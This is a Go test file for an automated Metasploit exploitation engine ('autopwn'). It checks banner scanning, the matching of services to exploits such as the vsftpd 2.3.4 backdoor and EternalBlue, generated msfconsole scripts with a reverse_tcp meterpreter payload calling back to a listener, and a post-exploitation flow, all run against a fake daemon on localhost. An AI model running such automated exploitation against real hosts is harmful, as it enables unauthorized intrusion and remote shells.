package autopwn

import (
	"context"
	"fmt"
	"net"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/Autumn-27/artex/msfrpc"
)

// fakeMSF implements MSF without a daemon, recording what the engine asked for.
type fakeMSF struct {
	mu         sync.Mutex
	modules    map[string]bool // "type/name" → exists
	sessions   map[string]msfrpc.Session
	consoleOut string
	cmdOut     map[string]string // session id → output
	runScripts []string
	infoCalls  []string
	sessionSeq int
}

func newFakeMSF() *fakeMSF {
	return &fakeMSF{
		modules:  map[string]bool{},
		sessions: map[string]msfrpc.Session{},
		cmdOut:   map[string]string{},
	}
}

func (f *fakeMSF) Version(context.Context) (string, error) { return "6.4.0-test", nil }

func (f *fakeMSF) Sessions(context.Context) (map[string]msfrpc.Session, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	out := make(map[string]msfrpc.Session, len(f.sessions))
	for k, v := range f.sessions {
		out[k] = v
	}
	return out, nil
}

func (f *fakeMSF) ModuleInfo(_ context.Context, typ, name string) (map[string]any, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.infoCalls = append(f.infoCalls, typ+":"+name)
	if f.modules[typ+":"+name] {
		return map[string]any{"name": name}, nil
	}
	return nil, fmt.Errorf("module not found: %s", name)
}

func (f *fakeMSF) RunConsole(_ context.Context, script string, _ time.Duration, stop func(string, bool) bool) (string, error) {
	f.mu.Lock()
	f.runScripts = append(f.runScripts, script)
	out := f.consoleOut
	// A real console would open a session as a side effect of `run -j`.
	if strings.Contains(script, "run -j") && !strings.Contains(script, "SESSION") {
		f.sessionSeq++
		id := fmt.Sprint(f.sessionSeq)
		f.sessions[id] = msfrpc.Session{ID: id, Type: "shell", TunnelPeer: "10.0.0.5:4444", ViaExploit: "exploit/unix/ftp/vsftpd_234_backdoor"}
		f.cmdOut[id] = "uid=0(root)"
	}
	f.mu.Unlock()
	if stop != nil {
		stop(out, false)
	}
	return out, nil
}

func (f *fakeMSF) SessionCommand(_ context.Context, id, typ, cmd string) (string, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	return f.cmdOut[id], nil
}

func (f *fakeMSF) lastScript() string {
	f.mu.Lock()
	defer f.mu.Unlock()
	if len(f.runScripts) == 0 {
		return ""
	}
	return f.runScripts[len(f.runScripts)-1]
}

// fakeFTP starts a TCP listener that greets like vsftpd 2.3.4 (the exact banner
// the rule table keys off) and returns its port.
func fakeFTP(t *testing.T) int {
	t.Helper()
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("listen: %v", err)
	}
	t.Cleanup(func() { _ = ln.Close() })
	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				return
			}
			_, _ = conn.Write([]byte("220 (vsFTPd 2.3.4)\r\n"))
			_ = conn.Close()
		}
	}()
	return ln.Addr().(*net.TCPAddr).Port
}

func TestParsePorts(t *testing.T) {
	got, err := ParsePorts("21,22,80")
	if err != nil || len(got) != 3 {
		t.Fatalf("got=%v err=%v", got, err)
	}
	got, err = ParsePorts("1-3,3,5")
	if err != nil || fmt.Sprint(got) != "[1 2 3 5]" {
		t.Fatalf("range got=%v err=%v", got, err)
	}
	if _, err := ParsePorts("0"); err == nil {
		t.Fatal("端口 0 应报错")
	}
	if _, err := ParsePorts("http"); err == nil {
		t.Fatal("非数字应报错")
	}
	if got, err := ParsePorts(""); err != nil || got != nil {
		t.Fatalf("空串应返回 nil，得到 %v %v", got, err)
	}
}

func TestScanTargetReadsBanner(t *testing.T) {
	port := fakeFTP(t)
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	findings := ScanTarget(ctx, "127.0.0.1", []int{port}, time.Second, 4)
	if len(findings) != 1 {
		t.Fatalf("findings=%v", findings)
	}
	f := findings[0]
	if f.Product != "vsftpd 2.3.4" || f.Service != "ftp" {
		t.Fatalf("banner 未识别：%+v", f)
	}
	if !strings.Contains(f.Banner, "vsFTPd") {
		t.Fatalf("banner=%q", f.Banner)
	}
}

func TestMatchRulesResolveModules(t *testing.T) {
	cands := Match("10.0.0.5", []PortFinding{
		{Port: 445, Service: "smb", Product: "smb"},
		{Port: 21, Service: "ftp", Product: "vsftpd 2.3.4"},
	}, "10.0.0.1", 4444)
	if len(cands) == 0 {
		t.Fatal("应命中候选")
	}
	var mods []string
	for _, c := range cands {
		mods = append(mods, c.Module)
		if c.Options["RHOSTS"] != "10.0.0.5" {
			t.Fatalf("RHOSTS 未注入：%+v", c)
		}
	}
	joined := strings.Join(mods, ",")
	if !strings.Contains(joined, "ms17_010") {
		t.Fatalf("SMB 未匹配 ms17_010：%v", mods)
	}
	if !strings.Contains(joined, "vsftpd") {
		t.Fatalf("vsftpd 未匹配：%v", mods)
	}
	// Confidence ordering: higher first.
	for i := 1; i < len(cands); i++ {
		if cands[i-1].Confidence < cands[i].Confidence {
			t.Fatalf("候选未按置信度排序：%+v", cands)
		}
	}
}

func TestConsoleScript(t *testing.T) {
	// 非反弹 payload：不写 LHOST/LPORT（否则 msfconsole 报 Unknown datastore option）。
	script := ConsoleScript(Candidate{
		Module:  "exploit/unix/ftp/vsftpd_234_backdoor",
		Payload: "cmd/unix/interact",
		Options: map[string]string{"RPORT": "2121", "PAYLOAD": "ignored", "LHOST": "9.9.9.9"},
	}, "10.0.0.1", 4444)
	want := "use exploit/unix/ftp/vsftpd_234_backdoor\nset RPORT 2121\nset PAYLOAD cmd/unix/interact\nrun -j\n"
	if script != want {
		t.Fatalf("script=\n%q\nwant\n%q", script, want)
	}
	// 反弹 payload：LHOST/LPORT 必须写进去。
	rev := ConsoleScript(Candidate{
		Module:  "exploit/windows/smb/ms17_010_eternalblue",
		Payload: "windows/x64/meterpreter/reverse_tcp",
		Options: map[string]string{"RHOSTS": "10.0.0.5", "RPORT": "445"},
	}, "10.0.0.1", 4444)
	for _, line := range []string{"set RHOSTS 10.0.0.5", "set LHOST 10.0.0.1", "set LPORT 4444", "set PAYLOAD windows/x64/meterpreter/reverse_tcp"} {
		if !strings.Contains(rev, line) {
			t.Fatalf("反弹脚本缺 %q：\n%s", line, rev)
		}
	}
}

func TestEngineDryRunDoesNotExecute(t *testing.T) {
	port := fakeFTP(t)
	f := newFakeMSF()
	f.modules["exploit:exploit/unix/ftp/vsftpd_234_backdoor"] = true
	eng := New(f, Options{
		Targets: []string{"127.0.0.1"}, Ports: []int{port},
		LHOST: "127.0.0.1", DryRun: true, Log: func(string, ...any) {},
	})
	sum := eng.Run(context.Background())
	if len(sum.Results) != 1 || len(sum.Results[0].Candidates) == 0 {
		t.Fatalf("dry-run 应产出候选：%+v", sum.Results)
	}
	if len(sum.Results[0].Attempts) != 0 || len(f.runScripts) != 0 || len(f.infoCalls) != 0 {
		t.Fatalf("dry-run 不应执行模块：attempts=%d scripts=%d info=%d",
			len(sum.Results[0].Attempts), len(f.runScripts), len(f.infoCalls))
	}
}

func TestEngineExploitFlow(t *testing.T) {
	port := fakeFTP(t)
	f := newFakeMSF()
	f.modules["exploit:exploit/unix/ftp/vsftpd_234_backdoor"] = true
	f.consoleOut = "[*] Started reverse TCP handler on 127.0.0.1:4444\n[*] Command shell session 1 opened\n"
	eng := New(f, Options{
		Targets: []string{"127.0.0.1"}, Ports: []int{port},
		LHOST: "127.0.0.1", LPORT: 4444, WaitSession: 3 * time.Second,
		Post: true, Evidence: true, Log: func(string, ...any) {},
	})
	sum := eng.Run(context.Background())
	if len(sum.Results) != 1 {
		t.Fatalf("results=%+v", sum.Results)
	}
	r := sum.Results[0]
	if len(r.Attempts) == 0 || r.Attempts[0].Session != "1" {
		t.Fatalf("第一候选应拿到会话：%+v", r.Attempts)
	}
	if len(r.Sessions) != 1 || !strings.Contains(r.Sessions[0].Evidence, "uid=0(root)") {
		t.Fatalf("未采集会话证据：%+v", r.Sessions)
	}
	if len(sum.Sessions()) != 1 {
		t.Fatalf("sessions=%+v", sum.Sessions())
	}
	if len(r.Post) == 0 {
		t.Fatal("post=true 时应尝试后渗透模块")
	}
	script := f.lastScript()
	if !strings.Contains(script, "use exploit/unix/ftp/vsftpd_234_backdoor") {
		t.Fatalf("最后一个脚本不是利用脚本：%q", script)
	}
	if !strings.Contains(script, "set RHOSTS 127.0.0.1") || !strings.Contains(script, "set RPORT ") {
		t.Fatalf("脚本缺参数：%q", script)
	}
}

func TestEngineUnknownModuleIsRecorded(t *testing.T) {
	port := fakeFTP(t)
	f := newFakeMSF() // 不注册任何模块 → 全部 module_missing
	eng := New(f, Options{
		Targets: []string{"127.0.0.1"}, Ports: []int{port},
		LHOST: "127.0.0.1", WaitSession: time.Second, Log: func(string, ...any) {},
	})
	sum := eng.Run(context.Background())
	r := sum.Results[0]
	if len(r.Attempts) == 0 || !strings.Contains(r.Attempts[0].Error, "module_missing") {
		t.Fatalf("应记录 module_missing：%+v", r.Attempts)
	}
	if len(f.runScripts) != 0 {
		t.Fatal("模块缺失时不应发 console 脚本")
	}
}

func TestEngineUnreachableTarget(t *testing.T) {
	f := newFakeMSF()
	eng := New(f, Options{
		Targets: []string{"127.0.0.1"}, Ports: []int{1}, ScanTimeout: 300 * time.Millisecond,
		Log: func(string, ...any) {},
	})
	sum := eng.Run(context.Background())
	if len(sum.Results) != 1 || sum.Results[0].Note != "无开放端口" {
		t.Fatalf("应记录无开放端口：%+v", sum.Results)
	}
}
